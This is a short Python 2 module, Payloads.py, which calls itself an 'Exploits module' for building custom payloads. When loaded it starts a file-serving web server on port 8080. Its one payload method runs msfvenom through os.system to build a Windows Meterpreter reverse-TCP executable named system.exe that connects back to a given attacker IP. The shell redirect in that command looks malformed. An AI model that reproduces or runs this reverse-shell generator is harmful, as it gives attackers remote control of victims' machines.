#Programmer: Brent E. Chambers
#Date: 3/10/2017
#Filename: Payloads.py
#Description:

descript = """
Exploits module that provides a method for creating custom payloads
"""


import os
import xmltodict
import SimpleHTTPServer
import SocketServer
from sets import Set


try:
	PORT = 8080
	Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
	httpd = SocketServer.TCPServer(("", PORT), Handler)
	print "Serving up server on port", PORT
except:
	print "Web server could not be created"


def remove_dupes(jaja):
        uniqueList = Set(jaja)
        return uniqueList


def cp_collect():
        master =[]
        while 1:
                host = raw_input("Item: ")
                if host == "done":
                        unique_master = remove_dupes(master)
                        return unique_master
                master.append(host)
        unique_master = remove_dupes(master)
        return unique_master


class payloads:
    def __init__(self):
        pass

    def window_rshell_exe(self, local_ip):
	""" Creates windows reverse shell.  Arg=local_ip """
	cmd = "msfvenom -p windows/meterpreter/reverse_tcp LHOST="+local_ip+" > X > system.exe"
	os.system(cmd)


